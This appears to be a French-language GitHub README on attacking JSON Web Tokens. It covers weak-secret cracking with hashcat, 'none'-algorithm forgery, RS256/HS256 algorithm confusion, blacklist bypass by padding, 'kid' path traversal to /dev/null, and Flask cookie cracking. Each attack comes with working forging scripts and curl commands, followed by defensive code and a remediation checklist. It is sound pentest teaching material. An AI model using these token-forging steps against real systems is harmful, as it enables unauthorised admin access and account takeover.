


#  JWT Attacks — Guide complet d'exploitation

> **Auteur :** [@spectramz](https://github.com/exploit4040) — *"Le roi des pirates"* 🏴‍☠️
> **Catégorie :** Web Exploitation — Cryptographie appliquée
> **Niveau :** Intermédiaire à Avancé
> **Tags :** `jwt`, `hmac`, `rsa`, `algorithm-confusion`, `jwt-cracking`, `token-forgery`, `web-security`, `pentest`

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Security](https://img.shields.io/badge/Category-Web%20Security-red.svg)]()
[![Offensive](https://img.shields.io/badge/Usage-Offensive%20Security-orange.svg)]()
[![Made with ❤️](https://img.shields.io/badge/Made%20with-%E2%9D%A4%EF%B8%8F-red.svg)]()

---

##  Table des matières

- [Introduction](#-introduction)
- [Anatomie d'un JWT](#-anatomie-dun-jwt)
- [Attaque 1 — Secret HMAC faible](#-attaque-1--secret-hmac-faible)
- [Attaque 2 — Algorithme "none"](#-attaque-2--algorithme-none)
- [Attaque 3 — Algorithm Confusion (RS256 → HS256)](#-attaque-3--algorithm-confusion-rs256--hs256)
- [Attaque 4 — Contournement de blacklist par padding](#-attaque-4--contournement-de-blacklist-par-padding)
- [Attaque 5 — Path Traversal dans le paramètre `kid`](#-attaque-5--path-traversal-dans-le-paramètre-kid)
- [Attaque 6 — Cracking de clé Flask](#-attaque-6--cracking-de-clé-flask)
- [Outils de référence](#-outils-de-référence)
- [Méthodologie de test](#-méthodologie-de-test)
- [Remédiation](#-remédiation)
- [Références](#-références)
- [Licence](#-licence)

---

##  Introduction

Les **JSON Web Tokens (JWT)** sont devenus le standard de facto pour l'authentification stateless dans les applications modernes. Leur popularité repose sur leur simplicité : un token auto-porteur, signé cryptographiquement, qui peut être vérifié sans accès à une base de données.

Cependant, cette simplicité cache de **nombreux pièges** dans lesquels les développeurs tombent régulièrement :

- Clés secrètes faibles ou hardcodées
- Algorithmes mal validés côté serveur
- Mauvaise gestion de la révocation
- Confiance aveugle dans les en-têtes du token

Ce guide regroupe les **6 attaques les plus courantes** sur les JWT, avec pour chacune :

- Le principe théorique
- La méthodologie d'exploitation
- Les outils à utiliser
- Les mesures de remédiation

>  **Avertissement légal** — Ce contenu est destiné à la formation, au pentest autorisé et à la sécurisation d'applications. Ne jamais utiliser ces techniques sans autorisation écrite préalable.

---

##  Anatomie d'un JWT

Un JWT est composé de **trois parties** séparées par des points :

```
<header>.<payload>.<signature>
```

### Exemple décodé

**Header** (base64url) :
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload** (base64url) :
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": false,
  "iat": 1516239022,
  "exp": 1516242622
}
```

**Signature** (HMAC-SHA256) :
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

### Points clés

| Élément | Rôle |
|---------|------|
| `alg` | Algorithme de signature (`HS256`, `RS256`, `none`…) |
| `kid` | Identifiant de la clé (optionnel) |
| `exp` | Date d'expiration |
| `iat` | Date d'émission |
| `jti` | Identifiant unique du token (utile pour la révocation) |

### Deux grandes familles d'algorithmes

| Famille | Exemple | Clé de signature | Clé de vérification |
|---------|---------|------------------|---------------------|
| **Symétrique** | HS256, HS384, HS512 | Secret partagé | Même secret |
| **Asymétrique** | RS256, RS384, RS512, ES256 | Clé privée | Clé publique |

---

##  Attaque 1 — Secret HMAC faible

### Principe

Quand un JWT est signé avec un algorithme symétrique (HS256, HS384, HS512), la sécurité repose **entièrement** sur le secret partagé. Si ce secret est :

- Un mot du dictionnaire
- Un mot de passe court
- Une valeur hardcodée (`secret`, `1234`, `changeme`…)

… alors il peut être **cassé hors ligne** par force brute.

### Méthodologie

**Étape 1 — Récupérer un token**

Intercepter un JWT valide via :
- Le cookie de session
- Le header `Authorization: Bearer <token>`
- Le localStorage
- Les logs serveur

**Étape 2 — Identifier l'algorithme**

Décoder le header en base64url :

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
```

Résultat :
```json
{"alg":"HS256","typ":"JWT"}
```

**Étape 3 — Cracker le secret avec hashcat**

```bash
hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt
```

- `-a 0` : attaque par dictionnaire
- `-m 16500` : mode JWT (détecte automatiquement HS256/384/512)
- `token.txt` : fichier contenant le JWT complet
- `rockyou.txt` : wordlist de référence (14M de mots)

**Résultat** (exemple) :
```
eyJhbGc...:secret123
```

**Étape 4 — Forger un nouveau token**

Une fois le secret connu, on signe un token avec les claims modifiés (ex : `admin: true`, `role: admin`, `sub: admin`).

**Avec Python** :

```python
import jwt

payload = {"username": "admin", "role": "admin"}
token = jwt.encode(payload, "secret123", algorithm="HS256")
print(token)
```

**Avec `flask-unsign`** (pour Flask) :

```bash
flask-unsign --sign --cookie "{'role':'admin'}" --secret 'secret123'
```

### Défenses

- Clé de **256 bits minimum** générée avec `secrets.token_hex(32)`
- Jamais de secret dans le code source
- Rotation périodique des clés
- Utilisation d'un gestionnaire de secrets (Vault, AWS Secrets Manager)

---

##  Attaque 2 — Algorithme "none"

### Principe

Le JWT supporte un algorithme spécial : **`none`**. Il indique qu'aucune signature n'est appliquée. Certaines bibliothèques mal configurées acceptent ce type de token, ce qui permet de forger un JWT **sans connaître aucun secret**.

### Méthodologie

**Étape 1 — Vérifier la vulnérabilité**

Intercepter un token valide, puis tenter de le modifier :

1. Décoder le header et le payload
2. Remplacer `"alg": "HS256"` par `"alg": "none"`
3. Modifier le payload (ex : `"admin": true`)
4. Supprimer la signature (garder le point final)

**Token original** :
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SIGNATURE
```

**Token forgé** :
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

Note le **point final** obligatoire (2 séparateurs = 3 parties dont une vide).

**Étape 2 — Envoyer le token**

```bash
curl http://<cible>/admin \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
```

### Variantes de casse

Certaines bibliothèques acceptent `none`, `None`, `NONE`, `nOnE`. Il faut tester toutes les variantes.

### Défenses

```python
#  Vulnérable
jwt.decode(token, options={"verify_signature": False})

#  Sécurisé — forcer l'algorithme
jwt.decode(token, SECRET, algorithms=["HS256"])
```

**Jamais** passer une liste d'algorithmes contenant `none` ou vide.

---

##  Attaque 3 — Algorithm Confusion (RS256 → HS256)

### Principe

C'est l'une des attaques les plus **élégantes** sur les JWT. Elle exploite le fait que la bibliothèque JWT utilise **la même variable** pour stocker la clé, quel que soit l'algorithme.

**Rappel** :

| Algorithme | Clé de vérification |
|------------|---------------------|
| RS256 | Clé **publique** (connue de tous) |
| HS256 | Clé **secrète** (privée) |

**La faille** : si le serveur accepte à la fois RS256 et HS256, un attaquant peut :

1. Récupérer la clé publique (souvent exposée sur `/key`, `/jwks.json`…)
2. Forger un token avec `"alg": "HS256"`
3. Signer ce token avec la **clé publique** comme si c'était un secret HMAC
4. Le serveur, croyant vérifier une signature HS256, utilise la clé publique comme secret → **signature valide**

### Méthodologie

**Étape 1 — Récupérer la clé publique**

```bash
curl http://<cible>/key
```

Ou via un endpoint JWKS :
```bash
curl http://<cible>/.well-known/jwks.json
```

**Étape 2 — Obtenir un token légitime**

```bash
curl -X POST http://<cible>/auth -d "username=guest"
```

Décoder le header :
```json
{"alg": "RS256", "typ": "JWT"}
```

**Étape 3 — Forger un token HS256**

```python
import jwt
import requests

# Récupérer la clé publique
public_key = requests.get("http://<cible>/key").text

# Payload admin
payload = {"username": "admin", "role": "admin"}

# Forger le token avec HS256 en utilisant la clé publique comme secret
forged = jwt.encode(
    payload,
    public_key,
    algorithm="HS256",
    headers={"alg": "HS256", "typ": "JWT"}
)
print(forged)
```

**Étape 4 — Utiliser le token**

```bash
curl -X POST http://<cible>/admin \
  -H "Authorization: Bearer <FORGED_TOKEN>"
```

### Défenses

```python
#  Forcer l'algorithme attendu
jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])

#  Ne JAMAIS faire
jwt.decode(token, PUBLIC_KEY, algorithms=["RS256", "HS256"])
```

**Règle d'or** : une clé RSA ne doit **jamais** être utilisée comme secret HMAC. Certaines bibliothèques lèvent d'ailleurs une erreur si on essaie (`InvalidKeyError`).

---

##  Attaque 4 — Contournement de blacklist par padding

### Principe

Pour révoquer un JWT avant son expiration, certaines applications maintiennent une **blacklist** des tokens révoqués. Si cette blacklist compare les tokens **en tant que chaînes de caractères**, il est possible de contourner la révocation en **modifiant légèrement** le token sans changer sa validité.

L'astuce la plus simple : ajouter un **padding base64** (`=`) à la fin du token.

### Méthodologie

**Étape 1 — Obtenir un token et le révoquer**

1. Se connecter pour obtenir un JWT
2. Le serveur l'ajoute automatiquement à la blacklist
3. Une requête sur `/admin` retourne : `{"msg": "Token is revoked"}`

**Étape 2 — Modifier le token**

Ajouter un `=` à la fin :

```
Original  : eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE
Modifié   : eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE=
```

**Pourquoi ça marche ?**

Le padding base64 est **optionnel** : la bibliothèque JWT l'ignore lors du décodage, mais la comparaison de chaînes `token in blacklist` échoue car les deux chaînes sont différentes.

**Étape 3 — Envoyer le token modifié**

```bash
curl http://<cible>/admin \
  -H "Authorization: Bearer eyJhbGc...SIGNATURE="
```

### Autres variantes de contournement

| Technique | Exemple |
|-----------|---------|
| Padding `=` | `...SIGNATURE=` |
| Padding `==` | `...SIGNATURE==` |
| Casse de l'algorithme | `HS256` → `hs256` |
| Espace en fin de token | `...SIGNATURE ` |
| Nouvelle signature (si secret connu) | Forge complète |

### Défenses

**Ne jamais** blacklister un token **en tant que chaîne**. Il faut :

1. **Décoder le token** et stocker son `jti` (JWT ID) dans la blacklist
2. Ou stocker un **hash** du token (SHA-256) et comparer les hashs
3. Ou utiliser des tokens à **durée de vie très courte** (5 min) + refresh tokens

```python
#  Vulnérable
blacklist.add(access_token)

#  Sécurisé
decoded = jwt.decode(access_token, SECRET, algorithms=["HS256"])
blacklist.add(decoded["jti"])
```

---

##  Attaque 5 — Path Traversal dans le paramètre `kid`

### Principe

Le paramètre `kid` (Key ID) du header JWT indique au serveur **quelle clé utiliser** pour vérifier la signature. Dans certaines implémentations, le `kid` est utilisé pour construire un **chemin de fichier** :

```python
key_path = os.path.join("keys", kid + ".pem")
with open(key_path, "rb") as f:
    key = f.read()
```

Si le `kid` n'est pas validé, on peut :

1. **Path Traversal** : pointer vers un fichier arbitraire
2. **Null Byte** : tronquer le chemin
3. **Fichier connu** : utiliser un fichier dont on connaît le contenu comme clé

### Méthodologie

**Étape 1 — Décoder le header**

```json
{
  "alg": "HS256",
  "kid": "b901bb24-700b-4cc6-a71a-cb207ab61313",
  "typ": "JWT"
}
```

**Étape 2 — Tester le Path Traversal**

Remplacer le `kid` par :

```
"kid": "../../../../../../dev/null"
```

Comme `/dev/null` est un fichier **vide**, la clé HMAC devient une **chaîne vide**. On peut donc signer le token avec un secret vide.

**Étape 3 — Contourner les filtres `../`**

Le filtre retire `../` une seule fois. On utilise donc `....//` qui devient `../` après suppression :

```
"kid": "....//....//....//....//....//dev/null"
```

**Étape 4 — Forger le token avec un secret vide**

```python
import jwt

header = {"alg": "HS256", "kid": "....//....//....//....//....//dev/null", "typ": "JWT"}
payload = {"user": "admin"}

token = jwt.encode(payload, "", algorithm="HS256", headers=header)
print(token)
```

**Note** : `jwt.io` refuse les secrets vides. Il faut utiliser `openssl` ou PyJWT.

**Étape 5 — Envoyer le token**

```bash
curl http://<cible>/admin \
  -H "Authorization: Bearer <FORGED_TOKEN>"
```

### Défenses

```python
#  Toujours utiliser une liste blanche de kid
ALLOWED_KIDS = {"key1", "key2", "key3"}

if kid not in ALLOWED_KIDS:
    raise ValueError("Invalid kid")

key_path = os.path.join("keys", kid + ".pem")
```

**Règles** :
- Ne **jamais** utiliser le `kid` comme chemin de fichier directement
- Vérifier le chemin avec `os.path.realpath()` et s'assurer qu'il reste dans le dossier autorisé
- Ne pas se contenter de remplacer `../` (contournable)

---

##  Attaque 6 — Cracking de clé Flask

### Principe

Flask utilise un cookie de session signé avec `app.secret_key`. Si cette clé est faible ou choisie parmi une **liste connue**, on peut la retrouver par force brute et **forger** des cookies de session.

### Méthodologie

**Étape 1 — Récupérer le cookie**

```
session=eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.arkdGg._uBS-m04WrfiUZQr6WNEXn30JpI
```

**Étape 2 — Cracker la clé avec `flask-unsign`**

```bash
flask-unsign --unsign \
  --cookie "eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.arkdGg._uBS-m04WrfiUZQr6WNEXn30JpI" \
  --wordlist /usr/share/wordlists/rockyou.txt \
  --no-literal-eval
```

**L'option `--no-literal-eval` est cruciale** : sans elle, `flask-unsign` plante sur les mots numériques (comme `123456`) car il essaie de les interpréter comme des entiers Python.

**Résultat** :
```
[+] Found secret key after 70144 attempts
b's3cr3t'
```

**Étape 3 — Forger un cookie admin**

```bash
flask-unsign --sign \
  --cookie "{'admin': True, 'username': 'admin'}" \
  --secret 's3cr3t' \
  --no-literal-eval
```

**Attention aux types** : si le cookie original contient `admin: 'false'` (chaîne), il faut envoyer `admin: 'true'` (chaîne) et non `admin: True` (booléen).

**Étape 4 — Utiliser le cookie**

```bash
curl http://<cible>/admin \
  -b "session=<FORGED_COOKIE>"
```

### Liste de clés Flask courantes

Si `rockyou.txt` échoue, tester manuellement :

```
secret, password, admin, flask, s3cr3t, cookie, session,
123456, changeme, root, test, dev, development, key,
supersecret, mysecret, jwt-secret, jwt_secret
```

### Défenses

```python
#  Clé robuste générée aléatoirement
import secrets
app.secret_key = secrets.token_hex(32)
```

**Règles** :
- **256 bits** minimum
- Jamais commitée dans le code
- Chargée via variable d'environnement
- Rotation périodique

---

## 🛠️ Outils de référence

| Outil | Usage | Installation |
|-------|-------|--------------|
| **jwt.io** | Décodage/forge visuel | En ligne |
| **hashcat** | Cracking de secret HMAC | `apt install hashcat` |
| **john** | Alternative à hashcat | `apt install john` |
| **flask-unsign** | Cracking/forge de cookie Flask | `pip install flask-unsign` |
| **jwt_tool** | Suite complète d'attaques JWT | `git clone https://github.com/ticarpi/jwt_tool` |
| **PyJWT** | Bibliothèque Python | `pip install pyjwt` |
| **Burp Suite** | Interception/modification HTTP | PortSwigger |
| **CyberChef** | Décodage/encodage multi-format | En ligne |

### Commandes utiles

```bash
# Décoder un JWT
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d

# Cracker un JWT
hashcat -a 0 -m 16500 token.txt rockyou.txt

# Voir les résultats hashcat
hashcat -a 0 -m 16500 token.txt rockyou.txt --show

# Cracker un cookie Flask
flask-unsign --unsign --cookie "..." --wordlist rockyou.txt --no-literal-eval

# Forger un cookie Flask
flask-unsign --sign --cookie "{'admin':True}" --secret 'secret' --no-literal-eval
```

---

##  Méthodologie de test

Quand tu rencontres un JWT lors d'un pentest, suis cette checklist :

### 1. Reconnaissance

- [ ] Récupérer un token valide
- [ ] Décoder header + payload
- [ ] Noter l'algorithme (`alg`)
- [ ] Noter les claims (`role`, `admin`, `sub`, `kid`…)
- [ ] Vérifier la présence d'un endpoint de clé publique (`/key`, `/jwks.json`)

### 2. Tests d'attaque

- [ ] **Algorithme `none`** : modifier `alg` → `none`, supprimer la signature
- [ ] **Secret faible** : `hashcat -m 16500` avec rockyou
- [ ] **Algorithm Confusion** : si RS256 + clé publique exposée → forger HS256
- [ ] **Path Traversal `kid`** : `../../../../dev/null`
- [ ] **Blacklist bypass** : ajouter `=` à la fin
- [ ] **Claims modifiés** : `admin: true`, `role: admin`, `sub: admin`

### 3. Confirmation

- [ ] Tester chaque payload forgé sur un endpoint protégé
- [ ] Vérifier les réponses (200 vs 401 vs 403)
- [ ] Documenter les payloads qui fonctionnent

---

##  Remédiation

### Côté serveur

| Mesure | Priorité |
|--------|----------|
| Forcer l'algorithme attendu (`algorithms=["RS256"]`) | 🔴 Critique |
| Clé de 256 bits minimum générée aléatoirement | 🔴 Critique |
| Ne jamais utiliser `none` | 🔴 Critique |
| Blacklister par `jti` (pas par token brut) | 🟠 Haute |
| Valider le `kid` contre une liste blanche | 🟠 Haute |
| Utiliser des durées de vie courtes (5-15 min) | 🟠 Haute |
| Implémenter des refresh tokens | 🟡 Moyenne |
| Journaliser les échecs d'authentification | 🟡 Moyenne |
| Rotation des clés de signature | 🟢 Faible |

### Exemple de code sécurisé (Python / PyJWT)

```python
import jwt
from jwt.exceptions import InvalidTokenError
import secrets
import os

# Clé robuste
SECRET_KEY = os.environ["JWT_SECRET"]  # généré avec secrets.token_hex(32)

def verify_token(token: str) -> dict:
    try:
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=["HS256"],       # ← forcer l'algo
            options={
                "require": ["exp", "iat", "sub"],
                "verify_exp": True,
                "verify_iat": True,
            }
        )
        return payload
    except InvalidTokenError as e:
        raise ValueError(f"Token invalide : {e}")

def revoke_token(token: str) -> None:
    payload = verify_token(token)
    jti = payload.get("jti")
    if jti:
        blacklist.add(jti)   # ← blacklister par jti, pas par token
```

### Checklist de sécurité

- [ ] Clé de signature robuste (256 bits)
- [ ] Algorithme forcé côté serveur
- [ ] `none` rejeté
- [ ] `kid` validé par liste blanche
- [ ] Blacklist par `jti`
- [ ] Durée de vie courte
- [ ] Refresh tokens séparés
- [ ] HTTPS obligatoire
- [ ] Cookies `HttpOnly` + `Secure` + `SameSite=Strict`
- [ ] Rotation des clés

---

## 📚 Références

### Spécifications et documentation

- [RFC 7519 — JSON Web Token](https://datatracker.ietf.org/doc/html/rfc7519)
- [RFC 7515 — JSON Web Signature](https://datatracker.ietf.org/doc/html/rfc7515)
- [RFC 7518 — JSON Web Algorithms](https://datatracker.ietf.org/doc/html/rfc7518)
- [OWASP — JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

### Articles et recherches

- [Critical vulnerabilities in JSON Web Token libraries — Auth0](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [Hacking JSON Web Tokens — Rudra Pratap](https://medium.com/cyberverse/hacking-json-web-tokens-8e16dc1f6a3e)
- [Attacking JWT Authentication — Sjoerd Langkemper](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)
- [JWT Algorithm Confusion — PortSwigger](https://portswigger.net/web-security/jwt/algorithm-confusion)

### Outils

- [jwt_tool — Ticarpi](https://github.com/ticarpi/jwt_tool)
- [flask-unsign — Paradoxis](https://github.com/Paradoxis/Flask-Unsign)
- [hashcat](https://hashcat.net/hashcat/)
- [PyJWT](https://pyjwt.readthedocs.io/)

### Wordlists

- [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
- [SecLists](https://github.com/danielmiessler/SecLists)

---

## 🏴‍☠️ À propos de l'auteur

**SpectraMz** — Passionné de cybersécurité offensive, bug bounty hunter et rédacteur de write-ups.

- 🐙 GitHub : [@exploit4040](https://github.com/exploit4040)
- 🎯 Spécialités : Web Exploitation, Pentest, Red Team, Cryptographie appliquée
- 📝 Blog : *à venir*

> *"Un token, c'est une promesse. Une signature, c'est une preuve. Ne jamais faire confiance à l'une sans vérifier l'autre."* 🏴‍☠️

---
📄 Licence

##### Ce projet est publié sous licence MIT. Voir le fichier LICENSE pour plus de détails.
